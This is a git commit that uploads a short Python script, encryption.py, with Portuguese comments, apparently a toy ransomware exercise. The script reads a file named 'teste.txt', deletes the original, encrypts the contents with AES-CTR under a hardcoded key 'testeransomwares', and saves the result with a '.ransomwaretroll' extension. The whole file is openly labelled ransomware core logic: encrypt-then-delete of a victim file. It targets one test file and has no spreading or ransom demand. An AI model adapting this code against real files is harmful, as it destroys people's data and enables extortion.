6ff165ff760f3b05fd05fd332ae5a1aec6ee07ad
maicowp <81197664+maicowp@users.noreply.github.com>
2024-01-13 17:30:05 -0300

    Add files via upload

---
+++ encryption.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+## Abre o arquivo a ser criptografado
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## Remove o arquivo
+os.remove(file_name)
+
+## Insere a chave de criptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## Criptografa o arquivo
+crypto_data = aes.encrypt(file_data)
+
+## Salva o arquivo criptografado
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
